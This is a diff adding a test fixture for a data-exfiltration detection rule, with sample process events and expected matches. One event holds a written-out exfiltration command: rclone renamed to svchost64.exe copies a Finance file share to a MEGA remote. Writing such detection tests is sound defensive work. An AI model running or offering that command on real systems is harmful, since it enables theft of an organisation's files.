@@ -1,0 +1,14 @@
+rule: detections/data-exfiltration-tool.yaml
+description: A renamed rclone copying to MEGA fires and is marked renamed; rclone version and robocopy don't.
+data:
+  DeviceProcessEvents:
+    - {ago: 10m, DeviceName: fs01, AccountName: mallory, FileName: svchost64.exe, ProcessVersionInfoOriginalFileName: rclone.exe, FolderPath: 'C:\ProgramData\svchost64.exe', ProcessCommandLine: 'svchost64.exe copy \\fs01\Finance mega:bk --transfers 16 --config C:\ProgramData\r.conf', InitiatingProcessFileName: cmd.exe}
+    - {ago: 10m, DeviceName: it-ws-01, AccountName: alice, FileName: rclone.exe, ProcessVersionInfoOriginalFileName: rclone.exe, FolderPath: 'C:\Tools\rclone.exe', ProcessCommandLine: 'rclone.exe version', InitiatingProcessFileName: cmd.exe}
+    - {ago: 10m, DeviceName: fs02, AccountName: backup, FileName: robocopy.exe, ProcessVersionInfoOriginalFileName: robocopy.exe, FolderPath: 'C:\Windows\System32\robocopy.exe', ProcessCommandLine: 'robocopy.exe D:\Shares \\nas\backup /MIR', InitiatingProcessFileName: cmd.exe}
+expect:
+  rows: 1
+  include:
+    - {DeviceName: fs01, Renamed: true}
+  exclude:
+    - {DeviceName: it-ws-01}
+    - {DeviceName: fs02}
